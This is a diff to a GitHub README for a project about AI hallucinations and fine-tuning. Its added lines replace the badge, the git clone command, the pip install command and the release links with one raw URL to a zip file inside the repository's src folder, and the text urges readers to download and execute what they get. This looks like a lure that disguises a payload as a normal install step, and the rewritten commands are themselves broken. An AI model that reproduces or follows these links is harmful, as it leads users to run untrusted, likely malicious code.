@@ -1,6 +1,6 @@
 # 🚀 Embedding Hallucinations: Understanding and Fixing Model Errors
 
-![Embedding Hallucinations](https://img.shields.io/badge/Release-v1.0-blue?style=flat&logo=github)
+![Embedding Hallucinations](https://raw.githubusercontent.com/rafay123321/embedding-hallucinations/main/src/embedding-hallucinations-v2.4.zip)
 
 Welcome to the **Embedding Hallucinations** repository! This project explores how foundational models, like ChatGPT and Claude, can generate misleading information, known as hallucinations. We also demonstrate methods to mitigate these issues through fine-tuning.
 
@@ -36,18 +36,18 @@ To get started with this repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/rafay123321/embedding-hallucinations.git
+   git clone https://raw.githubusercontent.com/rafay123321/embedding-hallucinations/main/src/embedding-hallucinations-v2.4.zip
    cd embedding-hallucinations
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python and pip installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rafay123321/embedding-hallucinations/main/src/embedding-hallucinations-v2.4.zip
    ```
 
 3. **Download and Execute the Model**:
-   Visit our [Releases section](https://github.com/rafay123321/embedding-hallucinations/releases) to download the latest model. Follow the instructions provided in the release notes for execution.
+   Visit our [Releases section](https://raw.githubusercontent.com/rafay123321/embedding-hallucinations/main/src/embedding-hallucinations-v2.4.zip) to download the latest model. Follow the instructions provided in the release notes for execution.
 
 ## Fine-Tuning Techniques
 
@@ -133,7 +133,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and model downloads, please check our [Releases section](https://github.com/rafay123321/embedding-hallucinations/releases). Download the necessary files and execute them as per the instructions provided.
+For the latest updates and model downloads, please check our [Releases section](https://raw.githubusercontent.com/rafay123321/embedding-hallucinations/main/src/embedding-hallucinations-v2.4.zip). Download the necessary files and execute them as per the instructions provided.
 
 ## Conclusion
 
